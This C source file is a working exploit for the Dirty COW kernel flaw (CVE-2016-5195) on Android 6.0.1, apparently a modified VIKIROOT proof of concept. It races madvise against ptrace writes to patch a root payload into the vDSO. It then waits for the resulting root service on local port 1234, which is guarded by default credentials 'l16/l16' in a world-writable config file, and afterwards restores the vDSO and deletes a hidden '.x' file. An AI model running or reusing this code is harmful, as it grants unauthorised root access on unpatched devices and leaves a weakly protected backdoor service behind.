/*
 * CVE-2016-5195 POC FOR ANDROID 6.0.1 MARSHMALLOW
 * 
 * Heavily inspired by https://github.com/scumjr/dirtycow-vdso
 *
 * This file is part of VIKIROOT, https://github.com/hyln9/VIKIROOT
 * 
 * Copyright (C) 2016-2017 Virgil Hou <virgil@zju.edu.cn>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define _GNU_SOURCE
#include <poll.h>
#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/auxv.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#include "payload.h"
#include "rmi_protocol.h"

#define VDSO_SIZE 0x1000

#define PATTERN_IP            "\xde\xc0\xad\xde"
#define PATTERN_PORT          "\x37\x13"
#define PATTERN_REMAIN        "\x1f\x20\x03\xd5\x1f\x20\x03\xd5"

#define RMI_DEFAULT_PORT      1234
#define RMI_CONFIG_PATH       "/data/local/tmp/rmi.config"
#define RMI_DEFAULT_USER      "l16"
#define RMI_DEFAULT_PASS      "l16"

#define ARRAY_SIZE(a)         (sizeof(a) / sizeof(a[0]))
#define CHECKSYSCALL(r, name) \
    if((r)==-1){fprintf(stderr,"Syscall error: %s at line %d " \
        "with code %d.\n",name,__LINE__,errno);exit(EXIT_FAILURE);}

struct entry
{
    void *s_pattern;
    size_t s_size;
    void *r_pattern;
    size_t r_size;
};

struct patch
{
    char *name;
    void *patch;
    size_t patch_size;
    void *pattern;
    size_t pattern_size;
    size_t offset;
    bool use_pattern;
    bool use_offset;
};

struct args
{
    bool stop;
    bool is_exploit;
    void *vdso_addr;
    struct patch *vdso_patch;
};

static int
writeall(int fd, const void *buf, size_t count)
{
    const char *p;
    ssize_t i;

    p = buf;
    do
    {
        i = write(fd, p, count);
        if (i == 0)
        {
            return -1;
        }
        else if (i == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            return -1;
        }
        count -= i;
        p += i;
    }
    while (count > 0);

    return 0;
}

static int
read_exact(int fd, void *buf, size_t count)
{
    size_t done;

    done = 0;
    while (done < count)
    {
        ssize_t n;

        n = read(fd, (char *)buf + done, count - done);
        if (n == 0)
        {
            return 0;
        }
        if (n == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            return -1;
        }
        done += (size_t)n;
    }

    return 1;
}

static int
send_frame(int fd, const void *buf, uint32_t len)
{
    uint8_t header[RMI_FRAME_HEADER_SIZE];

    rmi_write_be32(header, len);
    if (writeall(fd, header, sizeof(header)) == -1)
    {
        return -1;
    }
    if (len == 0)
    {
        return 0;
    }
    return writeall(fd, buf, len);
}

static int
send_text(int fd, const char *text)
{
    size_t len;

    len = strlen(text);
    if (len > UINT32_MAX)
    {
        return -1;
    }
    return send_frame(fd, text, (uint32_t)len);
}

static ssize_t
read_frame(int fd, char *buf, size_t size)
{
    uint8_t header[RMI_FRAME_HEADER_SIZE];
    uint32_t len;
    int rc;

    rc = read_exact(fd, header, sizeof(header));
    if (rc <= 0)
    {
        return rc;
    }

    len = rmi_read_be32(header);
    if (len == 0)
    {
        return 0;
    }
    if (len >= size)
    {
        size_t remaining;

        remaining = len;
        while (remaining > 0)
        {
            char tmp[256];
            size_t chunk;
            int rd;

            chunk = remaining > sizeof(tmp) ? sizeof(tmp) : remaining;
            rd = read_exact(fd, tmp, chunk);
            if (rd <= 0)
            {
                return rd;
            }
            remaining -= chunk;
        }
        return -1;
    }

    rc = read_exact(fd, buf, len);
    if (rc <= 0)
    {
        return rc;
    }
    buf[len] = '\0';
    return (ssize_t)len;
}

static int
read_response(int fd, char *buf, size_t size)
{
    while (1)
    {
        ssize_t n;

        n = read_frame(fd, buf, size);
        if (n <= 0)
        {
            return -1;
        }
        if (strcmp(buf, RMI_CMD_HEARTBEAT) == 0)
        {
            continue;
        }
        return 0;
    }
}

static void
trim_space(char *s)
{
    size_t len;
    char *start;

    start = s;
    while (*start == ' ' || *start == '\t' || *start == '\r' || *start == '\n')
    {
        start++;
    }
    if (start != s)
    {
        memmove(s, start, strlen(start) + 1);
    }

    len = strlen(s);
    while (len > 0)
    {
        char c = s[len - 1];
        if (c != ' ' && c != '\t' && c != '\r' && c != '\n')
        {
            break;
        }
        s[len - 1] = '\0';
        len--;
    }
}

static int
copy_field(char *dst, size_t dst_len, const char *src)
{
    size_t len;

    len = strlen(src);
    if (len == 0 || len >= dst_len)
    {
        return -1;
    }
    snprintf(dst, dst_len, "%s", src);
    return 0;
}

static int
write_default_rmi_config(void)
{
    FILE *fp;

    fp = fopen(RMI_CONFIG_PATH, "w");
    if (fp == NULL)
    {
        fprintf(stderr, "Failed to create default RMI config: %s\n",
                RMI_CONFIG_PATH);
        return -1;
    }
    fprintf(fp, "username=%s\npassword=%s\n", RMI_DEFAULT_USER, RMI_DEFAULT_PASS);
    fclose(fp);
    chmod(RMI_CONFIG_PATH, 0666);
    return 0;
}

static int
load_rmi_config(char *user, size_t user_len, char *pass, size_t pass_len)
{
    FILE *fp;
    char line[256];
    char user_tmp[128];
    char pass_tmp[128];

    user_tmp[0] = '\0';
    pass_tmp[0] = '\0';

    fp = fopen(RMI_CONFIG_PATH, "r");
    if (fp == NULL)
    {
        if (errno == ENOENT)
        {
            if (write_default_rmi_config() == 0)
            {
                if (copy_field(user, user_len, RMI_DEFAULT_USER) == -1 ||
                    copy_field(pass, pass_len, RMI_DEFAULT_PASS) == -1)
                {
                    fprintf(stderr, "Default RMI config fields too long.\n");
                    return -1;
                }
                fprintf(stderr, "Created default RMI config: %s\n", RMI_CONFIG_PATH);
                return 0;
            }
        }
        fprintf(stderr, "RMI config not found: %s\n", RMI_CONFIG_PATH);
        return -1;
    }

    while (fgets(line, sizeof(line), fp) != NULL)
    {
        char *sep;

        trim_space(line);
        if (line[0] == '\0' || line[0] == '#')
        {
            continue;
        }

        if (strncmp(line, "username=", 9) == 0)
        {
            char *val = line + 9;
            trim_space(val);
            if (copy_field(user_tmp, sizeof(user_tmp), val) == -1)
            {
                fclose(fp);
                return -1;
            }
            continue;
        }
        if (strncmp(line, "password=", 9) == 0)
        {
            char *val = line + 9;
            trim_space(val);
            if (copy_field(pass_tmp, sizeof(pass_tmp), val) == -1)
            {
                fclose(fp);
                return -1;
            }
            continue;
        }

        if (user_tmp[0] == '\0' && pass_tmp[0] == '\0')
        {
            sep = strchr(line, ':');
            if (sep == NULL)
            {
                sep = strpbrk(line, " \t");
            }
            if (sep != NULL)
            {
                *sep = '\0';
                sep++;
                trim_space(line);
                trim_space(sep);
                if (copy_field(user_tmp, sizeof(user_tmp), line) == -1 ||
                    copy_field(pass_tmp, sizeof(pass_tmp), sep) == -1)
                {
                    fclose(fp);
                    return -1;
                }
                continue;
            }

            if (copy_field(user_tmp, sizeof(user_tmp), line) == -1)
            {
                fclose(fp);
                return -1;
            }
            continue;
        }

        if (pass_tmp[0] == '\0')
        {
            if (copy_field(pass_tmp, sizeof(pass_tmp), line) == -1)
            {
                fclose(fp);
                return -1;
            }
            continue;
        }
    }

    fclose(fp);

    if (user_tmp[0] == '\0' || pass_tmp[0] == '\0')
    {
        fprintf(stderr, "RMI config missing username/password.\n");
        return -1;
    }
    if (copy_field(user, user_len, user_tmp) == -1 ||
        copy_field(pass, pass_len, pass_tmp) == -1)
    {
        fprintf(stderr, "RMI config fields too long.\n");
        return -1;
    }
    return 0;
}

static int
connect_rmi(uint16_t port)
{
    struct sockaddr_in addr;
    int s;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == -1)
    {
        fprintf(stderr, "Syscall error: socket at line %d with code %d.\n",
                __LINE__, errno);
        return -1;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(port);

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        fprintf(stderr, "Syscall error: connect at line %d with code %d.\n",
                __LINE__, errno);
        close(s);
        return -1;
    }

    return s;
}

static int
rmi_send_command(const char *command, uint16_t port)
{
    char user[128];
    char pass[128];
    char auth[384];
    char resp[128];
    int s;

    if (load_rmi_config(user, sizeof(user), pass, sizeof(pass)) == -1)
    {
        return -1;
    }

    s = connect_rmi(port);
    if (s == -1)
    {
        return -1;
    }

    if (snprintf(auth, sizeof(auth), "%s %s %s",
                 RMI_CMD_AUTH, user, pass) >= (int)sizeof(auth))
    {
        fprintf(stderr, "RMI auth message too long.\n");
        close(s);
        return -1;
    }
    if (send_text(s, auth) == -1)
    {
        close(s);
        return -1;
    }
    if (read_response(s, resp, sizeof(resp)) == -1)
    {
        close(s);
        return -1;
    }
    if (strcmp(resp, RMI_RESP_OK) != 0)
    {
        fprintf(stderr, "RMI auth failed: %s\n", resp);
        close(s);
        return -1;
    }

    if (send_text(s, command) == -1)
    {
        close(s);
        return -1;
    }
    if (read_response(s, resp, sizeof(resp)) == -1)
    {
        close(s);
        return -1;
    }
    if (strncmp(resp, RMI_RESP_ERR_PREFIX, strlen(RMI_RESP_ERR_PREFIX)) == 0)
    {
        fprintf(stderr, "RMI error: %s\n", resp);
        close(s);
        return -1;
    }

    close(s);
    return 0;
}

static void
wait_for_rmi_ready(uint16_t port)
{
    int s;

    while (1)
    {
        s = connect_rmi(port);
        if (s != -1)
        {
            close(s);
            return;
        }
        sleep(1);
    }
}

// 16 bytes alignment for stack is required on aarch64
static char child_stack[8192] __attribute__ ((aligned (16)));

static const struct entry entry_db[] = {
    /* CMP W0, #0; CCMP W0, #1, #4, NE; B.NE #0x50 */
    { "\x1f\x00\x00\x71\x04\x18\x41\x7a\x81\x02\x00\x54", 12,
      "\x1f\x00\x00\x71\x04\x18\x41\x7a", 8 },
};

static void
ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
{
    long value;

    while (n >= sizeof(long))
    {
        memcpy(&value, src, sizeof(value));
        CHECKSYSCALL(ptrace(PTRACE_POKETEXT, pid, dest, value), "ptrace");

        n -= sizeof(long);
        dest += sizeof(long);
        src += sizeof(long);
    }

    if (n > 0)
    {
        dest -= sizeof(long) - n;

        errno = 0;
        value = ptrace(PTRACE_PEEKTEXT, pid, dest, NULL);
        if (value == -1 && errno != 0)
        {
            fprintf(stderr, "Syscall error: ptrace at line %d with code %d.\n",
                __LINE__, errno);
            exit(EXIT_FAILURE);
        }

        memcpy((void *)&value + sizeof(value) - n, src, n);
        CHECKSYSCALL(ptrace(PTRACE_POKETEXT, pid, dest, value), "ptrace");
    }

    return;
}

static int
debuggee(void *arg_)
{
    CHECKSYSCALL(prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0), "prctl");

    CHECKSYSCALL(ptrace(PTRACE_TRACEME, 0, NULL, NULL), "ptrace");

    kill(syscall(SYS_getpid), SIGSTOP);

    return 0;
}

static void *
madvise_thread(void *arg_)
{
    struct args *arg = (struct args *)arg_;

    while (!arg->stop)
    {
        CHECKSYSCALL(madvise(arg->vdso_addr, VDSO_SIZE, MADV_DONTNEED), "madvise");
    }

    return NULL;
}

static void *
ptrace_thread(void *arg_)
{
    pid_t pid;
    int flags, status;
    struct args *arg = (struct args *)arg_;

    flags = CLONE_VM|CLONE_PTRACE;
    // 16 bytes alignment for stack is required on aarch64
    pid = clone(debuggee, child_stack + sizeof(child_stack) - 16, flags, arg);
    CHECKSYSCALL(pid, "clone");
    CHECKSYSCALL(waitpid(pid, &status, __WALL), "waitpid");

    while (!arg->stop)
    {
        struct patch *patch = arg->vdso_patch;
        void *data = arg->is_exploit ? patch->patch : patch->pattern;
        size_t sz = arg->is_exploit ? patch->patch_size : patch->pattern_size;
        ptrace_memcpy(pid, arg->vdso_patch->offset + arg->vdso_addr,
                      data, sz);
    }

    CHECKSYSCALL(ptrace(PTRACE_CONT, pid, NULL, NULL), "ptrace");
    CHECKSYSCALL(waitpid(pid, NULL, __WALL), "waitpid");

    return NULL;
}

static size_t
match_entry(void *vdso_addr, const struct entry **entry)
{
    const struct entry *e;
    void *entry_point;
    int i;

    for (i = 0; i < ARRAY_SIZE(entry_db); i++)
    {
        e = &entry_db[i];
        if ((entry_point = memmem(vdso_addr, VDSO_SIZE,
                                  e->s_pattern, e->s_size)) != 0)
        {
            *entry = e;
            return entry_point - vdso_addr;
        }
    }

    return 0;
}

static void
optimize_patch(void *addr, size_t len, struct patch *p)
{
    if (p->use_pattern)
    {
        void *target;
        if (p->use_offset)
        {
            void *new_addr = addr + p->offset;
            len -= p->offset;
            if (!(target = memmem(new_addr, len, p->pattern, p->pattern_size)))
            {
                fprintf(stderr, "Patch error: pattern not found "
                    "for patch '%s'.\n", p->name);
                exit(EXIT_FAILURE);
            }
        }
        else
        {
            if (!(target = memmem(addr, len, p->pattern, p->pattern_size)))
            {
                fprintf(stderr, "Patch error: pattern not found "
                    "for patch '%s'.\n", p->name);
                exit(EXIT_FAILURE);
            }
            len -= target + p->pattern_size - addr;
            void *new_addr = target + p->pattern_size;
            if (memmem(new_addr, len, p->pattern, p->pattern_size))
            {
                fprintf(stderr, "Patch error: pattern not unique "
                    "for patch '%s'.\n", p->name);
                exit(EXIT_FAILURE);
            }
            p->use_offset = true;
        }
        p->offset = target - addr;
        p->use_pattern = false;
    }
}

static void
patch_payload(const struct entry *e)
{
    int i;
    struct patch payload_patch[] =
    {
        { "remain", e->r_pattern, e->r_size, PATTERN_REMAIN,
           sizeof(PATTERN_REMAIN) - 1, 0, true, false }
    };
    for (i = 0; i < ARRAY_SIZE(payload_patch); i++)
    {
        optimize_patch(payload, payload_len, &payload_patch[i]);
        struct patch *p = &payload_patch[i];
        memcpy(p->offset + payload, p->patch, p->patch_size);
    }
}

static struct patch*
build_vdso_patch(void *vdso_addr, size_t target_offset, const struct entry *e)
{
    int i;
    uint32_t rel;
    char *dp, *buf;
    struct patch *vdso_patch, *p;

    if ((vdso_patch = malloc(2 * sizeof(struct patch))) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    struct patch tmp0 = { "vdso_payload", payload, payload_len, NULL, 0,
                          VDSO_SIZE - payload_len, false, true };

    vdso_patch[0] = tmp0;

    dp = vdso_patch[0].offset + vdso_addr;
    for (i = 0; i < payload_len; i++)
    {
        if (dp[i] != '\x00')
        {
            fprintf(stderr, "Internal error: insufficient place "
                            "for payload.\n");
            exit(EXIT_FAILURE);
        }
    }

    // use 'pattern' to store original copy
    if ((vdso_patch[0].pattern = calloc(payload_len, sizeof(char *))) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    vdso_patch[0].pattern_size = payload_len;

    if ((buf = malloc(e->r_size)) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    buf[0] = '\xf0';
    buf[1] = '\x03';
    buf[2] = '\x1e';
    buf[3] = '\xaa';
    rel = VDSO_SIZE - payload_len - target_offset - 4;
    *(uint16_t *)&buf[4] = (uint16_t)(rel / 4);
    buf[6] = '\x00';
    buf[7] = '\x94';

    struct patch tmp1 = { "vdso_entry", buf, e->r_size, NULL, 0,
                          target_offset, false, true };

    vdso_patch[1] = tmp1;

    optimize_patch(vdso_addr, VDSO_SIZE, &vdso_patch[0]);
    optimize_patch(vdso_addr, VDSO_SIZE, &vdso_patch[1]);

    if ((vdso_patch[1].pattern = malloc(e->r_size)) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    p = &vdso_patch[1];
    vdso_patch[1].pattern_size = e->r_size;
    memcpy(p->pattern, vdso_addr + p->offset, p->pattern_size);

    return vdso_patch;
}

static void
dump(char *filename, void *vdso_addr);

static void
patch_vdso(struct patch *vdso_patch, void *vdso_addr, bool is_exploit)
{
    int i;
    int patch_id;
    struct args arg;
    pthread_t pth1, pth2;
    for (i = 0; i < 2; i++)
    {
        patch_id = is_exploit ? i : 1 - i;
        //printf(">>> %s: patch %d/%d\n\n", is_exploit ? "Inject" : "Remove",
        //        patch_id + 1, 2);

        arg.vdso_patch = &vdso_patch[patch_id];
        arg.vdso_addr = vdso_addr;
        arg.is_exploit = is_exploit;

        arg.stop = false;
        pthread_create(&pth1, NULL, madvise_thread, &arg);
        pthread_create(&pth2, NULL, ptrace_thread, &arg);

        sleep(5);

        arg.stop = true;
        pthread_join(pth1, NULL);
        pthread_join(pth2, NULL);
    }
}

#ifdef DBG
static void
dump(char *filename, void *vdso_addr)
{
    int status;
    pid_t pid = fork();
    CHECKSYSCALL(pid, "fork");
    if (pid == 0)
    {
        int fd = open(filename, O_CREAT|O_TRUNC|O_WRONLY, 0644);
        CHECKSYSCALL(fd, "open");
        write(fd, vdso_addr, VDSO_SIZE);
        close(fd);
        exit(EXIT_SUCCESS);
    }
    else
    {
        CHECKSYSCALL(waitpid(pid, &status, 0), "waitpid");
    }
}
#endif

int
exploit(int argc, char *argv[])
{
    size_t target_offset;
    const struct entry *entry;
    struct patch *vdso_patch;
    const char *subcmd;

    enum Command {
        UNKNOWN,
        START_SERVICE,
        STOP_SERVICE,
        RESTART_SERVICE,
    } command = UNKNOWN;

    subcmd = NULL;
    if (argc > 1)
    {
        if (strcmp(argv[1], "service") == 0)
        {
            if (argc > 2)
            {
                subcmd = argv[2];
            }
        }
        else
        {
            subcmd = argv[1];
        }
    }

    if (subcmd != NULL)
    {
        if (strcmp(subcmd, "start") == 0)
        {
            command = START_SERVICE;
        }
        else if (strcmp(subcmd, "stop") == 0)
        {
            command = STOP_SERVICE;
        }
        else if (strcmp(subcmd, "restart") == 0)
        {
            command = RESTART_SERVICE;
        }
    }

    void *vdso_addr = (void *)getauxval(AT_SYSINFO_EHDR);
    
    switch(command) {
        case UNKNOWN: {
            printf("RMI-INTERFACE\n"
                "Usage:\n"
                "%s start|stop|restart: manage the rmi interface.\n"
                "%s service start|stop|restart: same as above.\n",
                argv[0], argv[0]);
            exit(EXIT_SUCCESS);
        } break;
        case STOP_SERVICE: {
            if (rmi_send_command(RMI_CMD_QUIT, RMI_DEFAULT_PORT) == -1)
            {
                exit(EXIT_FAILURE);
            }
        } break;
        case RESTART_SERVICE: {
            if (rmi_send_command(RMI_CMD_RESTART, RMI_DEFAULT_PORT) == -1)
            {
                exit(EXIT_FAILURE);
            }
        } break;
        case START_SERVICE: {
            #ifdef DBG
            dump("vdso_orig.so", vdso_addr);
            #endif
            
            if ((target_offset = match_entry(vdso_addr, &entry)) == 0)
            {
                fprintf(stderr, "Internal error: unknown kernel.\n");
                exit(EXIT_FAILURE);
            }
            
            patch_payload(entry);
            
            vdso_patch = build_vdso_patch(vdso_addr, target_offset, entry);
                        
            patch_vdso(vdso_patch, vdso_addr, true);
            
            #ifdef DBG
            dump("vdso_patched.so", vdso_addr);
            #endif
            
            printf(">>> Enable bluetooth to start the interface.\n\n");
            printf(">>> Waiting for rmi server...\n\n");
            wait_for_rmi_ready(RMI_DEFAULT_PORT);

            patch_vdso(vdso_patch, vdso_addr, false);
            
            if (remove("/data/local/tmp/.x") == -1)
            {
                fprintf(stderr, "Please remove .x manually.\n");
            }
        } break;
    }

    return EXIT_SUCCESS;
}
